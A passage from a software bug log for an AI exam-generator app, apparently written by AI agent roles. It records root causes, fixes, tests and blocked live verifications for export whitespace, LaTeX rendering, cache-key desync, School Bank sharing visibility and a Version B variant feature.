- `src/lib/prompts/variantExam.ts` (new) — `buildVariantExamSystemPrompt()`/`buildVariantExamUserPrompt()`, same transform-prompt pattern as `translateExam.ts`: instructs Claude/Gemini to rewrite every exercise's numbers/names/context and fully recompute its solution, while explicitly listing every structural/gradable field (`type`, `difficulty`, `points`, `chapterIds`, sub-question/option counts and labels, bareme/microBareme labels+points) that must stay identical to Version A.
- `src/app/api/generate/version-b/route.ts` (new) — non-streaming route (same shape as `/api/exam/translate`): auth required, **server-side Pro gate** (403 for non-Pro, closing the direct-request bypass the old client-only gate allowed), charged against the **same monthly quota counter** `/api/generate` uses (flagging this quota choice for founder input below — a real second AI call is comparable cost to a fresh generation, so this was the conservative default, but it's arguably a pricing question, not just a technical one). Claude-primary/Gemini-fallback, same as every other AI route.
- `src/lib/variant.ts` — rewritten. The old shuffle-based `buildVersionB()` is gone; `mergeVariantExercise()`/`mergeVariantExercises()` now force-copy every structural/gradable field (id, number, type, difficulty, points, chapterIds, estimatedMinutes, sub-question labels/points, MCQ option labels/count, bareme/microBareme labels/points) from the original Version A exercise regardless of what the AI returned, and only take *content* (statement, options text, solution) from the AI response. This makes "same difficulty/points distribution as Version A" a **code-enforced guarantee**, not just a prompt instruction — verified in `src/__tests__/variant-merge.test.ts` with an adversarial "AI tries to change points/difficulty/chapterIds" test case.
- `src/lib/schemas/exercise.ts` (new) — `AIExerciseSchema` (and its sub-schemas) extracted out of `src/app/api/generate/route.ts` into a dependency-free module, so `/api/generate/version-b` validates the AI's response with the exact same Zod schema `/api/generate` uses for a fresh generation, per this session's task ask — and so unit tests can import it without pulling in `next/server`/`firebase-admin` (same constraint noted in `qcm.test.ts`'s own comment).
- UI trigger point: **Export (Step 5)**, not Step 2 — kept the existing Pro-gated "Variant: Version A / Version B" selector's location (that's where the real mechanism already lived per this bug's own root cause), but clicking "Version B" for the first time now calls the new route (shows a spinner, then caches the result in `sessionStorage` keyed like the main exercises cache so it survives a remount without a second AI call/quota charge) instead of instantly reordering client-side. Chose Export over Step 2 because Version B only makes sense once Version A's exercises are finalized, and Step 2's toggle already only ever produced Version A's own exercises before Step 4 — there was nothing distinct for it to gate.
- **Also fixed in the process (not previously tracked as its own bug):** PDF export (`/print`) never respected the variant selector at all — it read exercises from a fixed `sessionStorage` key with no awareness of Version A/B, so Version B previously could only ever be reflected in Word/email downloads, not PDF. `/print` now accepts `?variant=b` and falls back to Version A with a console warning if no cached Version B exists.
- Marketing copy: `src/app/api/admin/send-email/route.ts` and `src/app/api/cron/newsletter/route.ts` both described the old mechanism verbatim ("different numbers **and shuffled questions**") — corrected to "different numbers and wording, same difficulty" since exercise order is no longer shuffled. Everywhere else the feature is described (`src/app/page.tsx`'s FAQ, `src/app/ai-exam-generator-lebanon/page.tsx`, `src/app/blog/save-time-teaching/page.tsx`) already described "different numbers, same difficulty" accurately — no change needed there; BUG-036's Free/Pro pricing-tier copy mismatch is untouched (still open — that's a gating/pricing question, not a mechanism-accuracy one, and out of scope here per this session's task).
- Cleaned up two now-stale `e2e/phases/phase-2-exam-creation.spec.ts` tests that still asserted against the Step 2 toggle removed in the update above this one — they tested UI that no longer exists.
- Types: `Exam.versionB` (in `src/types/exam.ts`, previously unused/dead code — grepped confirmed no import site anywhere) was typed `Exam` but `ARCHITECTURE.md`'s own documented Firestore schema says `Exercise[]` — fixed to `Exercise[]` to match. Added the same `versionB?: Exercise[]` field to `SavedExam` (`src/lib/storage.ts`, the actual live type the localStorage-based library uses — note: exams are currently saved to browser `localStorage`, not the `users/{uid}/exams` Firestore path `CLAUDE.md` §7/`ARCHITECTURE.md` describe; that gap predates this session and wasn't touched).
- **Tests:** `src/__tests__/variant-exam-prompts.test.ts` (9 — prompt-builder determinism/content, mirrors `generate-prompts.test.ts`'s style) and `src/__tests__/variant-merge.test.ts` (14 — merge-logic structural guarantees including an adversarial "AI tries to overwrite points/difficulty" case, plus `AIExerciseSchema` Zod validation). `npm run type-check` clean, `npm test` 180/180 (157 baseline + 23 new), `npm run build` clean (verified `/api/generate/version-b` registered as a dynamic route).
- **Flagging for founder input (not decided unilaterally):** (1) Quota — Version B currently costs 1 unit of the same monthly Pro exam quota as a fresh generation; an alternative would be a separate, cheaper daily cap like `/api/exam/translate`'s, or making it free for Pro users who are already paying. (2) This is a real second Claude/Gemini API call per Version B generation — a Pro user regenerating Version B repeatedly (e.g. re-rolling for a better result) multiplies real AI cost; there's currently no cooldown beyond the shared monthly quota. (3) BUG-036's Free-vs-Pro copy mismatch is still open and unrelated to this fix — the words now accurately describe the mechanism, but Free-plan marketing copy still lists "Version A/B generation" while the gate remains Pro-only.
- **Needs security review** (per `CLAUDE.md` §15): new API route accepting user input (`/api/generate/version-b`) with its own auth/Pro-gate/quota logic.
- **Needs qa verification** (per `CLAUDE.md` §15): live click-through of Export → "Version B" → Word/PDF/email, confirming a real Pro account gets genuinely different numbers/wording with matching difficulty and points, and that a free-tier account still gets a clean 403 if it somehow reaches the route directly.

---

## BUG-043: Full generation is silently re-triggered (burning real quota + AI API cost) on any direct navigation/reload of the Generate step, not only via browser Back - generalizes BUG-039
**Status:** Very likely already resolved by BUG-039's fix (584de98) — live re-verification attempted 2026-09-27, blocked by environment constraints (see Update below), still not treated as a separate open bug
**Severity:** Critical
**Area:** Generation / UI (workflow state)
**Reported:** 2026-09-26 (QA exploratory Pro-tier pass, live production, real Pro test account)

**Description:** BUG-039 (2026-09-25) reported this only as a browser-Back-button issue. Retested as a real Pro user this pass: simply navigating directly to /create/generate by URL (address bar, not the browser Back button - e.g. returning to a bookmarked/previously-visited step, or a page reload) after already having completed Export for that exam also fails to restore the cached exam from sessionStorage and silently starts a brand-new /api/generate call instead - reproduced twice in one session. For a free-tier user this just fails loudly with a quota error (as BUG-039 noted); for a Pro user with quota remaining, it silently succeeds, generating and displaying a completely different exam with no warning that anything was discarded, and burns one of the account's paid monthly generations (and real Claude/Gemini API cost) for an exam that is never shown to have existed unless the user happens to export/save it before navigating away again.
**Steps to reproduce:**
1. As a Pro account, complete Describe -> Confirm -> Generate -> Export for an exam, downloading a file (which auto-saves it to the library).
2. Note the dashboard's quota counter and "Exams created" count.
3. Navigate directly to https://imtihan.live/create/generate via the address bar (not the in-app Back link, not the browser Back button).
4. Observe: the page shows "Generating exercises..." and produces a new, different exam (different numbers/context in my repro: a satellite/projectile problem became a completely different projectile+RLC-circuit problem) instead of restoring the one just exported.
5. Check the dashboard again: quota-used counter increments (2/10 -> 3/10 in my repro) but "Exams created" / the saved-library count does not, if the newly-generated exam is never exported or manually saved - that generation's cost and quota are simply gone.
**Root cause:** Same class of bug as BUG-039 (src/app/create/generate/page.tsx's sessionStorage cache-key mismatch on mount), but not specific to the back-button gesture - any fresh navigation/reload of this route hits the same "no valid cache match -> regenerate from scratch" branch. Confirms BUG-039's original root-cause hypothesis (a stale/mismatched imtihan_exercises_key written by one of the several persistExercises() call sites) generalizes beyond browser history navigation.
**Fix:** Not applied - reporting only, per QA role. Same fix target as BUG-039; this repro strengthens the case for prioritizing it, since for a Pro user this is a silent, repeatable way to burn paid quota and real AI API cost with zero recovery path or warning, not just a jarring UX surprise.
**Verification:** Reproduced live on production twice in one session with a real Pro account; confirmed via the dashboard's own quota counter (2/10 -> 3/10) and library count (stayed at 1) that the second generation was real, cost real quota, and was never recoverable.

**Update (2026-09-26, qa, same session):** Traced afterward - `engineering` landed a real fix for BUG-039 on `master` (commit `584de98`, routes every `imtihan_exercises` write through `persistExercises()` so the cache key can never desync) apparently during/after this repro. It is unclear whether that fix was live on production (Vercel) at the moment of my repro above, or whether my repro hit the pre-fix deployed bundle - the timing could not be established from this session alone. This BUG-043 report should be re-verified against production *after* confirming `584de98` is actually deployed (not just merged to `master`), rather than treated as a second, independent bug needing its own separate fix - it may already be closed.
**Update (2026-09-26, orchestrator):** Multiple commits (and Vercel deploys, this app auto-deploys on push to `master`) have landed after `584de98` since this repro was written — high confidence the fix is live by now, since every prior fix this session was confirmed deployed within a minute or two of pushing. Not personally re-verified live (would need a real Pro test account and a fresh repro, same constraint QA hit). `qa` should still do one quick live re-check before this is marked definitively closed, but this is not being tracked as separate open work for `engineering`.
**Update (2026-09-27, qa):** Attempted a fresh live re-verification per this session's task (the founder had just fixed a Vercel GitHub-connection gap that had silently blocked these 8 commits from ever reaching production before now). Could **not** complete a full fresh generate -> edit -> export -> direct-navigate-to-`/create/generate` round trip this session — blocked by three independent environment constraints, not a product/code issue: (1) `/auth/register` refused a brand-new signup with "Device limit reached. You cannot create more accounts from this device." — this machine already has 2 accounts on file from the 2026-09-25/26 QA passes (`imtihan.qa.explore.2026@...`, `imtihan.qa.pro.2026@...`), and the anti-abuse cap is working as intended, so a 3rd wasn't attempted around. (2) No password is stored anywhere for either existing test account (correctly — passwords are never logged), so re-using them required a password-reset email. (3) The password-reset email would have landed in mailinator's public inbox (the same disposable-email provider used for both accounts), but `https://www.mailinator.com` hard-blocked this session's outbound requests via Cloudflare ("Sorry, you have been blocked") on every attempt, with no interactive challenge to solve — so the reset link could never be retrieved. Did not attempt any workaround for either the device-limit or the account-recovery block (no localStorage/fingerprint clearing, no credential minting), per this role's standing rules. Net effect: BUG-039's own fix and BUG-043's generalization of it remain **unverified live this session** — this is a QA tooling/environment gap, not a signal the fix is broken. Everything else in this session's task (BUG-040, BUG-038, BUG-041) was independently verified live using an already-authenticated leftover session found at task start, without needing a new signup — see their own entries for detail.

---

## BUG-044: "Share to Student Bank" wording contradicts the feature's own "colleagues only" framing - sharing an exercise also publishes it, with full worked solution, directly to students
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Data (cross-feature interaction)
**Reported:** 2026-09-26 (QA exploratory Pro-tier pass, live production)

**Description:** /bank's "My School" tab describes the feature purely as teacher-to-teacher collaboration: "The School Bank lets Pro teachers share exercises with colleagues at the same school - building a private, institution-level question repository." But the actual share buttons tooltip and toast both say "Share to Student Bank" / "Sharing to student bank..." (src/app/bank/page.tsx:545) - and this is not just inconsistent copy: the exact same schoolBank Firestore collection (matched by schoolSlug) is read directly by src/app/student/practice/page.tsx and shown to students, including the full solution/methodology (SchoolExercise.exercise.solution.methodology, not just the statement). A teacher who shares an unused exercise from their personal bank - believing, per the "My School" tabs own copy, that this only reaches colleagues - is actually also giving their own students immediate access to that exercises complete worked answer via /student/practice, which could undermine using it on a real exam later.
**Steps to reproduce:**
1. Read /bank's "My School" empty-state and Pro-gate copy (colleagues-only framing) side by side with the share buttons tooltip/toast (student-bank framing) - same page, same action, contradictory language.
2. Trace src/app/bank/page.tsx's shareToSchoolBank() (writes to schoolBank) against src/app/student/practice/page.tsx's fetchSchoolExercises() (reads schoolBank filtered by the same schoolSlug, displays exercise.solution.methodology to students).
**Root cause:** Two independent features (/bank teacher-to-teacher sharing, /student/practice student self-practice) share one Firestore collection with no separation between "share with colleagues" and "publish to students" as distinct actions - but only one of the two consuming surfaces communicates this to the teacher at share time.
**Fix (2026-09-26, business decision — option b, split into two distinct actions):** Given School Bank is currently non-functional for viewing anyway (BUG-045, pending index deploy) and pre-launch has zero real users depending on current behavior, chose the smallest change that actually fixes the trust problem rather than the most elaborate one — a single new `visibleToStudents: boolean` field on `schoolBank` documents (default `false`, i.e. colleagues-only), not a second collection or duplicated write path:
- `src/app/bank/page.tsx`: the share button no longer writes instantly on click — it opens a confirmation modal with an explicit, unchecked-by-default "Also let students practice this exercise (they'll see the full solution)" checkbox. Updated the "My School" tab's description and the share button's tooltip to stop calling this "Student Bank" by default.
- `src/app/student/practice/page.tsx`: both `fetchSchoolExercises()` and `fetchAllPublicExercises()` now filter `where("visibleToStudents", "==", true)` — students only ever see exercises a teacher explicitly opted into.
- `firestore.indexes.json`: added the 2 new composite indexes these filtered queries need (`schoolSlug`+`visibleToStudents`+`sharedAt`, and `visibleToStudents`+`sharedAt`).
**Verification:** `npm run type-check` clean, `npm test` 149/149, `npm run build` clean. Not verified with a live click-through (memory-constrained machine, no dev server) — `qa` should confirm live once possible: share an exercise with the checkbox off, confirm it's colleague-visible but does NOT appear in `/student/practice`; repeat with the checkbox on and confirm it does.
**Update (2026-09-29, database, doc-reconciliation pass):** Per `FOUNDER_DECISIONS.md` #6 (answered 2026-09-27), the founder ran `firebase deploy --only firestore:indexes` — both indexes above are confirmed live, and School Bank (the dependent feature) is confirmed working. The index-deploy dependency this fix was waiting on is resolved. **Still open, unrelated to indexes:** `qa`'s live click-through of the `visibleToStudents` checkbox UI itself (does unchecked stay colleague-only, does checked actually reach `/student/practice`) has not been done — that's an app-behavior verification, not a deploy-state question, so it stays open.
**Update (2026-09-30, qa, verification attempt — still blocked, not a pass/fail):** Dispatched specifically to do this live click-through; could not, for tooling reasons unrelated to the app. This session's tool list was `Read`/`Bash`/`Grep`/`Glob` only — no `chrome-devtools` MCP tools, despite `CLAUDE.md` §15 documenting `qa` as having full `chrome-devtools` access and this being framed as an interactive, browser-driven task. Did not fabricate a browser session or fall back to `curl`/direct Firestore reads (neither can exercise Firebase's client-auth/session-cookie flow, so either would risk misreporting a fabricated pass). As secondary, non-conclusive evidence: read `src/app/bank/page.tsx` and `src/app/student/practice/page.tsx` end to end — the fix is internally consistent by code review (`shareToStudentsChecked` defaults `false` and resets on every `openShareConfirm()`; `shareToSchoolBank()` writes the field exactly as captured; `getSchoolBankExercises()` — the "My School" tab read — has no `visibleToStudents` filter, so colleagues always see a share regardless of the checkbox; `fetchSchoolExercises()`/`fetchAllPublicExercises()` in `student/practice/page.tsx` both filter `where("visibleToStudents", "==", true)`). This is evidence the fix is *coded* correctly, not proof of *live* behavior (rules rejection, modal mis-render, checkbox state desync are all invisible to a code read) — **item stays open.** This is now the 3rd consecutive `qa`/`design`/`seo-growth` session (2026-09-27, 2026-09-29 ×2, 2026-09-30) hitting a documented-tool-grant-vs-actually-attached-tools mismatch — worth an interactive-session check of dispatch/session tool provisioning rather than another identical retry.
**Update (2026-10-01, qa, verification attempt — still blocked, not a pass/fail):** Re-dispatched specifically for this live click-through again; blocked for the identical reason as 2026-09-30 — tool list was `Read`/`Bash`/`Grep`/`Glob` only, no `chrome-devtools` MCP tools. Did not fabricate a browser session or fall back to `curl`/direct Firestore reads. Additionally confirmed this session that a plain `Bash` file-write (`echo >> file`) is also permission-denied, same secondary gap 2026-09-30 hit — could not self-apply this update, relayed to orchestrator instead. **Item stays open.** This is now the **4th consecutive session** (2026-09-27, 2026-09-29, 2026-09-30, 2026-10-01) hitting this exact tool-provisioning gap on this specific bug, and the 6th across teams overall (`design`/`seo-growth` also hit it 2026-09-29). Recommend halting further identical re-dispatches until whoever manages session/tool provisioning investigates directly, rather than scheduling a 5th retry.

---

## BUG-045: "School Bank" / Community exam library (Pro feature) is completely broken for viewing - shares succeed but nothing ever shows, with zero user-facing error
**Status:** Fixed — same index as BUG-013, deployed and confirmed working; error-surfacing half also fixed
**Severity:** Critical
**Area:** Data / API (Firestore) / UI
**Reported:** 2026-09-26 (QA exploratory Pro-tier pass, live production, real Pro test account imtihan.qa.pro.2026@mailinator.com)

**Description:** The Pro-gated "School Bank" (marketed on /pricing and /upgrade as "Community exam library") lets a Pro teacher share a saved exercise with colleagues at the same school. The share action itself succeeds (verified via a read-only Admin SDK query - a real schoolBank document was created with the correct schoolSlug/schoolName/contributor fields), but the read query used to display shared exercises - both in /bank's "My School" tab and in the student-facing /student/practice page - throws FirebaseError: The query requires an index on every load, because the composite index for schoolBank (schoolSlug ==, sharedAt order) does not exist. The UI swallows this error completely: "My School" just shows "0 shared exercises... / No shared exercises yet", identical to the genuinely-empty state, with no toast/banner/user-visible indication anything is wrong. From a teacher's perspective this Pro feature looks like it silently does nothing - data disappears into Firestore with no way to ever see it again, for anyone (the sharer, colleagues, or students).
**Steps to reproduce:**
1. As a real Pro account with school set (via /bank's "Set your school first" form), generate an exam, use the per-exercise "Save to bank" action on Step 4 (Generate & Refine).
2. Go to /bank -> "My Bank" tab, hover the saved exercise, click the share icon (tooltip: "Share to Student Bank") - a "Sharing to student bank..." toast appears.
3. Click the "My School" tab. Observe: "0 shared exercises from <school>." / "No shared exercises yet" - even though the share in step 2 just ran.
4. Open DevTools console: [Bank] getSchoolBankExercises: FirebaseError: The query requires an index, with a direct Firebase Console link to create it.
**Root cause:** Missing Firestore composite index on the schoolBank collection for the schoolSlug (==) + sharedAt (orderBy) query used by both src/app/bank/page.tsx's getSchoolBankExercises() and src/app/student/practice/page.tsx's fetchSchoolExercises(). Confirmed via read-only Admin SDK query that the write path works fine - this is purely a missing-index read failure, silently caught and swallowed (no user-facing error surfaced).
**Fix:** This is NOT a new missing index — `firestore.indexes.json` already defines exactly this composite (`schoolSlug` ASC + `sharedAt` DESC on `schoolBank`), added for BUG-013 back on 2026-09-18. No new index-definition work needed.
Separately fixed 2026-09-26: `getSchoolBankExercises()`'s silent `catch { return [] }` (indistinguishable from genuinely-empty) replaced with a real error state — `src/app/bank/page.tsx` now shows a distinct "Couldn't load your school's shared exercises" card with a retry button instead of the misleading "No shared exercises yet" empty state on a real query failure. `npm run type-check` clean, `npm test` 149/149.
**Verification:** Reproduced live on production. Confirmed via console error message and via a read-only Firebase Admin SDK query (schoolBank collection, filtered by schoolSlug) that the share write actually succeeded (1 real document found) despite the read displaying zero results.
**Update (2026-09-29, database, doc-reconciliation pass):** Per `FOUNDER_DECISIONS.md` #6 (answered 2026-09-27), the founder ran `firebase deploy --only firestore:indexes` and confirmed School Bank working. Closing the "still blocked on deploy" language here, which had gone stale.

---


## BUG-041: Word (.docx) and PDF (`/print`) exports had redundant, compounding blank-space paragraphs — found while investigating a founder-reported "lots of white empty spaces" complaint
**Status:** Fixed
**Severity:** Medium
**Area:** Export
**Reported:** 2026-09-26 (founder, live, no specific repro — investigated blind per this session's task)
**Fixed:** 2026-09-26

**Description:** Founder reported seeing excessive blank/white space in both Word and PDF exam exports, with no specific repro steps. Checked first whether BUG-038 (KaTeX `\sqrt{}` SVG corruption in `/print`) or BUG-040 (raw unrendered `\boxed{}` LaTeX in Word export) — both fixed 2026-09-25/26 — already accounted for this: they don't; those were rendering-corruption/raw-text bugs, not whitespace. Generated a real sample .docx via a standalone script (`generateWordDocument()` called directly with a realistic 3-exercise exam including a `\boxed{\sqrt{...}}` expression, a markdown table, and a multiple-choice question) and inspected `word/document.xml` directly (unzipped, table-stripped to isolate body-level paragraphs from table-cell paragraphs, which don't create vertical whitespace). Found two distinct, concrete bugs — one in each export path:
1. **Word (.docx), `src/app/api/export/route.ts`:** three call sites pushed an unconditional filler `Paragraph({ text: "" })` (default/no spacing override) immediately before another element that *already* carries its own `spacing.before` — the end of every exercise in the main exam loop (before the next exercise's heading, which has `spacing: { before: 240, after: 120 }`), the end of every exercise in the corrigé loop (same), and right after the "CORRIGÉ" heading (before the first corrigé exercise's heading). Confirmed via table-stripped `document.xml` diffing that these were genuinely back-to-back body-level paragraphs (not separated by a table, unlike a couple of other spacer paragraphs that only *looked* adjacent in a naive scan because a `<w:tbl>` sat between them and got filtered out) — i.e., real, compounding, per-exercise redundant gaps, not a false positive.
2. **PDF (`/print`), `src/app/print/page.tsx`:** the CORRIGÉ section wrapper stacked `mt-8 pt-8` (2rem margin + 2rem padding ≈ 64px) on top of `.page-break { page-break-before: always }`'s own forced page break *and* the print stylesheet's `@page { margin: 20mm }` — margin-top has nothing above it to separate from on a freshly-forced page, so this was pure, redundant, additive blank space above the "CORRIGÉ" title on every exported PDF's answer-key page.
**Root cause:** Both are the same underlying pattern (spacer values were added independently over time at different call sites without checking what spacing the *next* element already provides), just in two unrelated rendering systems (docx OOXML paragraphs vs. browser print CSS) — not a shared code path, so each needed its own fix.
**Fix:** Removed the 3 redundant filler `Paragraph({ text: "" })` pushes in `route.ts` (kept every other spacer that has no such redundant neighbor, e.g. the ones immediately before/after a `Table` object, which has no spacing props of its own and genuinely needs a dedicated spacer). Changed `print/page.tsx`'s CORRIGÉ wrapper from `className="page-break mt-8 pt-8"` to `className="page-break"`, relying on the existing `@page` margin and the heading's own `mb-8` for spacing. Re-generated the sample .docx after the fix and re-inspected `document.xml`: the "blank paragraph directly before a spacing-carrying heading" pattern is gone (0 occurrences, down from a genuine, repeating-per-exercise redundancy); max consecutive empty body-level paragraphs anywhere in the document is now 2, and those 2 are legitimately separated by a real table in the actual rendered output.
**Not fixed / flagging for founder+design input, not a unilateral fix:** `print/page.tsx`'s per-exercise `.no-break { page-break-inside: avoid; }` (applied to both the main exercises and each corrigé exercise's wrapper `div`) is a genuine template-design tradeoff, not a clear-cut bug. It correctly prevents an exercise from being awkwardly split mid-statement/mid-table across a page boundary — but for a *tall* exercise (long methodology, several sub-questions, multiple KaTeX blocks) that doesn't fit in the remaining space on the current page, the browser's print engine pushes the *entire* block to the next page rather than splitting it, leaving whatever room was left on the previous page blank. This is a well-known, inherent CSS-print-pagination tension (avoid mid-block breaks vs. avoid blank gaps), and is plausibly a real contributor to what the founder saw for exams with a couple of long exercises — but removing/weakening `page-break-inside: avoid` risks a worse, more visible problem (an exercise statement or barème table visibly cut in half across a page break), which would likely generate its own bug report. Left untouched pending a decision on whether occasional bottom-of-page gaps are acceptable, or whether this needs a smarter conditional (e.g. only apply `no-break` below some estimated content-height threshold).
**Verification:** `npm run type-check` clean. `npm test` 149/149 (up from a 149-test baseline already inclusive of this session's separate BUG-039 fix — no whitespace-specific automated regression test added, since asserting on unzipped `document.xml` structure would require adding `jszip` as a new test-only dependency for a single test; instead verified the same way BUG-040 was verified — a real generated document, inspected directly, before and after the fix, with the "before" state showing the exact redundant-paragraph pattern described above and the "after" state showing it gone). `npm run build` **not run** — machine had <2GB free RAM throughout this session (see repeated notes elsewhere in this file); `type-check` + `test` were run per this task's explicit ask, `qa`/whoever has headroom should confirm both exports visually (a real Word open + a real PDF print-preview) when possible.

**Update (2026-09-27, qa, live verification post-deploy):** Confirmed live on production for both export paths, using a real free-tier account's already-generated exam via the dashboard's own "Download Word" / "Download PDF" actions (the Vercel deploy-gap that had blocked this fix from ever reaching production until today was fixed by the founder just before this session). **Word:** unzipped the live-downloaded `.docx`, table-stripped `word/document.xml` the same way engineering did pre-fix — max consecutive empty body-level paragraphs is 2 (down from what would have been a longer, per-exercise-repeating run pre-fix), and those 2 are genuinely separated by a real table, matching the described post-fix state exactly. **PDF (`/print`):** confirmed the CORRIGÉ section wrapper's `className` is now exactly `"page-break"` (no `mt-8 pt-8`) via a live DOM query, and a full-page screenshot shows CORRIGÉ appearing directly after the prior exercise's last sub-question with no visible oversized gap. Could not test true paginated print-preview (native OS print dialog isn't automatable from this tooling), so the specific "page-break-inside: avoid leaves a blank gap for a tall exercise" tradeoff flagged above as intentionally-not-fixed was not re-assessed — no new evidence either way on that specific sub-issue.

---

## BUG-040: Word (.docx) export left raw, unrendered LaTeX visible (\boxed{}, backslashes, stray $) when the AI nested malformed math inside \boxed{...}
**Status:** Fixed
**Severity:** High
**Area:** Export / Generation
**Reported:** 2026-09-26 (founder, live production examples)
**Fixed:** 2026-09-26

**Description:** Exported Word documents sometimes showed literal, unrendered LaTeX instead of clean math text — e.g. `\boxed{$y = h$ + x\tan\alpha - \frac{g}{2v_0^2\cos^2\alpha}\,x^2}` and `\boxed{$v = \sqrt${\frac{GM_T}{r}}}` appeared verbatim (backslashes, dollar signs, and all) in the exported .docx, rather than clean readable math.
**Root cause:** `src/app/api/export/route.ts`'s `createFormattedTextRuns()` had its own separate, simpler `\boxed{...}` handling than `renderContent.ts`'s (the shared browser/print renderer, which already had a proper repair function — `fixBoxedMath()` — for exactly this AI-generated malformation: stray `$...$` nested inside `\boxed{}` instead of one clean outer `$...$` pair around the whole expression). The export route's own regex (a) had no repair for the stray-`$` case, so splitting on `$` cut the expression apart mid-boxed-content and left everything after the stray closing `$` as raw, unconverted plain text, and (b) only matched one level of brace nesting, so a `\boxed{...}` wrapping something like `\sqrt{\frac{a}{b}}` (2+ levels deep) wasn't unwrapped at all.
**Fix:** Exported `fixBoxedMath()` from `renderContent.ts` and reused it in the export route (repairs the stray-`$` case) before applying a new `unwrapBoxed()` helper — a proper brace-depth-tracking walk (same approach as `fixBoxedMath`, adapted to fully unwrap `\boxed{}` regardless of nesting depth, since Word has no visual box styling to preserve). Added 4 regression tests (`src/__tests__/export-boxed-math.test.ts`) covering both real founder-reported examples plus a synthetic 4-level-deep nesting case. `npm run type-check` clean, `npm test` 142/142, `npm run build` clean.
**Verification:** Manually traced both real reported examples through the fixed pipeline via a standalone script before applying the fix, confirmed both produce clean, correctly-unwrapped, single well-formed math expressions with no stray `$`/`\boxed`/leftover backslash-command artifacts.

**Update (2026-09-27, qa, live verification post-deploy):** Confirmed live on production. Downloaded the real Word export of a live-generated exam whose corrigé happens to contain both of the founder's exact originally-reported patterns (a `\boxed{}` wrapping a `\tan`/`\frac` expression, and a `\boxed{}` wrapping `\sqrt{\frac{...}}`). Unzipped the `.docx` and scanned every `<w:t>` text node: zero literal backslash characters, zero `$` characters, zero occurrences of the word "boxed" anywhere in the document. The founder's exact reported symptom is gone. However, while verifying this, found the underlying LaTeX-to-Word conversion is still incomplete for constructs beyond what this fix targeted — raw command fragments (`dfrac`, `left(`/`right)`, `begin{cases}`/`end{cases}`, and a `\frac` nested inside a `\sqrt`) still leak into the exported text, sometimes with a mismatched brace/paren. Logged as new **BUG-046** (not a reopening of this bug — different constructs, likely a different gap in the same file) rather than marking this bug itself unfixed, since BUG-040's own narrow, exact repro is genuinely resolved.

## BUG-039: Browser back-navigation from Export (Step 5) to Generate (Step 4) silently discards the generated/edited exam and re-triggers a fresh generation
**Status:** Fixed
**Severity:** High
**Area:** Generation / UI (workflow state)
**Reported:** 2026-09-25 (QA exploratory pass, live production, `imtihan.qa.explore.2026@mailinator.com` real free-tier test account)
**Fixed:** 2026-09-26

**Description:** After generating an exam, editing an exercise (difficulty/points via the "Edit" modal), and reaching the Export step (Step 5), pressing the browser Back button to return to the Generate step (Step 4) does not restore the previously generated + edited exam from its `sessionStorage` cache as designed. Instead, the page mount effect finds no valid cache and silently calls `generateExam()` again, i.e. it attempts to generate a brand-new exam from scratch. In my session (free tier, quota already used) this surfaced as a clear "Generation failed - You have reached your limit of 1 free exam" screen - but for a Pro-tier user with quota remaining, this would silently replace the edited exam with a brand-new AI generation with zero warning, discarding the edits.
**Steps to reproduce:**
1. Sign in, go through Describe -> Confirm -> Generate to produce an exam.
2. On the Generate step, open Edit on Exercise 1, change difficulty/points, Save changes (confirms in UI).
3. Click Export exam to reach Step 5.
4. Press the browser Back button (real browser history back, not the in-app Back link).
5. Observe: the Generate step remounts and immediately attempts a fresh /api/generate call instead of restoring the edited exam.
**Root cause:** Not fully isolated, but strongly localized. `src/app/create/generate/page.tsx` mount effect (lines ~93-118) is designed to restore from `sessionStorage.imtihan_exercises` when its cache key (`JSON.stringify({c: context, t: templateId})`, stored via `persistExercises()`) matches the current context - explicitly commented as being for exactly this scenario (restore instead of hammering the Gemini API again). Live inspection of sessionStorage immediately after the failed back-navigation showed `imtihan_exercises` and `imtihan_exercises_key` were both null - the cache had been wiped, most likely by the mismatch-cleanup branch at lines 112-116 (`else if (cachedEx && cachedKey !== currentKey) { sessionStorage.removeItem(...) }`), which deletes the cache on any key mismatch. There are several `persistExercises()` call sites in this file (after edit, save-to-bank, regenerate, remove - lines ~217, 240, 306, 407, 420, 432) - one of them likely wrote a cache key that no longer matched context/templateId as freshly read on remount. Needs engineering to trace which write desynced the key (or whether `imtihan_templateId` - which is never actually set anywhere in the normal create flow, only read with a fallback of classic - contributes to the mismatch).
**Fix:** Traced precisely (QA's suspicion about `imtihan_templateId` was a red herring — confirmed it's never actually written anywhere in the normal create flow, i.e. it's dead/unused and *always* resolves to the "classic" fallback in a normal session, so it never causes a mismatch on its own). The real root cause: `persistExercises()` (the function meant to keep `imtihan_exercises` and `imtihan_exercises_key` in sync) was **defined but never actually called anywhere** — all 6 real write call sites (initial generation's two completion paths, `handleRegenerate`, `handleAddChapterExercise`, `handleRemove`, `handleEditorSave`) wrote `imtihan_exercises` directly via a raw `sessionStorage.setItem(...)`, bypassing `persistExercises()` entirely, so `imtihan_exercises_key` was left unset after the very first generation and every edit after it. On the next mount (real browser back-navigation), the mount effect's mismatch-cleanup branch (`cachedEx` present, `cachedKey` null/stale) concluded the cache was stale, wiped both `sessionStorage` entries, and the `context && status === "idle"` effect immediately re-triggered `generateExam()` — exactly QA's repro. Fixed by (1) routing all 6 write sites through `persistExercises()`, and (2) extracting the key-building logic (previously duplicated inline in both the write helper and the mount effect's read side, which is exactly the kind of duplication that let this drift in the first place) into a single shared `buildExercisesCacheKey()` helper in a new `src/lib/workflowCache.ts`, used by both the write and read paths so they can no longer compute the key differently.
**Verification:** Machine was memory-constrained throughout this session (<2GB free RAM at every check) — did not start a dev server or drive a real browser back-navigation. Instead traced the full read/write logic by hand (confirmed no other code path rewrites `imtihan_context` or `imtihan_exercises_key` between the Generate and Export steps that could otherwise explain a legitimate key mismatch) and added `src/__tests__/workflow-cache.test.ts` (7 tests): determinism/round-trip/differs-on-real-change checks for `buildExercisesCacheKey()`, a direct simulation of the exact QA repro (generate → edit → simulate remount → assert restored, not wiped, with the edited field intact), a check that a *genuine* context change is still correctly discarded (not silently over-restored), and a test reproducing the pre-fix bug shape (a write that skips the key desyncs the very next remount) to document what the bug actually was. `npm run type-check` clean. `npm test`: 149/149 (142 baseline + 7 new). `qa` should confirm live with the exact repro (generate → edit an exercise → export → real browser Back → exam should restore, not regenerate) once the machine has headroom for a dev server.

---

## BUG-038: KaTeX stretchy-symbol SVG glyphs (e.g. \sqrt{}) are corrupted in the PDF/print export - literal <br /> injected into SVG path d attributes
**Status:** Fixed
